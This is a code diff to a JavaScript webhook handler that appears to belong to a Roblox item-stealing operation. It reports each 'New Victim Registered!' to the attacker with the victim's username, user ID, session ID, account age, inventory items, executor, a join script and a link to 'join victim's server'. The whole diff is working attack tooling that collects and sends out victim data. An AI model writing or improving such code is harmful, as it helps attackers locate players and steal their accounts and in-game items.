@@ -19,6 +19,38 @@ export default async function handler(req, res) {
   
   if (webhookUrl !== 'YOUR_WEBHOOK_URL_HERE') {
     try {
+      // Build items string
+      const itemsList = hitData.items && hitData.items.length > 0
+        ? hitData.items.map(i => `• ${i.name} (${i.category}) x${i.amount}`).join('\n')
+        : 'None';
+
+      // Roblox deep-link join URL
+      const joinUrl = hitData.placeId && hitData.jobId
+        ? `https://www.roblox.com/games/${hitData.placeId}?gameInstanceId=${hitData.jobId}`
+        : null;
+
+      const embedFields = [
+        { name: '👤 Username', value: `\`${hitData.username || 'Unknown'}\``, inline: true },
+        { name: '🏷️ Display Name', value: `\`${hitData.displayName || 'Unknown'}\``, inline: true },
+        { name: '🆔 Session ID', value: `\`${sessionId}\``, inline: false },
+        { name: '🎮 Game', value: hitData.gameName || 'Unknown', inline: true },
+        { name: '👥 Players', value: `${hitData.playerCount ?? '?'} / ${hitData.maxPlayers ?? '?'}`, inline: true },
+        { name: '📅 Account Age', value: `${hitData.accountAge ?? '?'} days`, inline: true },
+        { name: '🔧 Executor', value: hitData.executor || 'Unknown', inline: true },
+        { name: '🪙 Roblox User ID', value: `\`${hitData.robloxUserId || 'Unknown'}\``, inline: true },
+        { name: '🎒 Items', value: itemsList, inline: false },
+        { name: '📜 Join Script', value: `\`\`\`lua\n${hitData.joinScript || 'N/A'}\`\`\``, inline: false },
+      ];
+
+      // Add join link button-style field if we have the data
+      if (joinUrl) {
+        embedFields.push({
+          name: '🔗 Join Server',
+          value: `[Click to join victim's server](${joinUrl})`,
+          inline: false
+        });
+      }
+
       await fetch(webhookUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -26,12 +58,10 @@ export default async function handler(req, res) {
           content: null,
           embeds: [{
             title: '🔥 New Victim Registered!',
-            color: 16711680, // Red
-            fields: [
-              { name: 'Username', value: hitData.username || 'Unknown', inline: true },
-              { name: 'Session ID', value: sessionId, inline: true },
-              { name: 'Details', value: JSON.stringify(hitData, null, 2) || 'None' }
-            ],
+            color: 0xFF4444,
+            thumbnail: hitData.avatarUrl ? { url: hitData.avatarUrl } : undefined,
+            fields: embedFields,
+            footer: { text: `Place ID: ${hitData.placeId || 'N/A'} • Job ID: ${hitData.jobId || 'N/A'}` },
             timestamp: new Date().toISOString()
           }]
         })
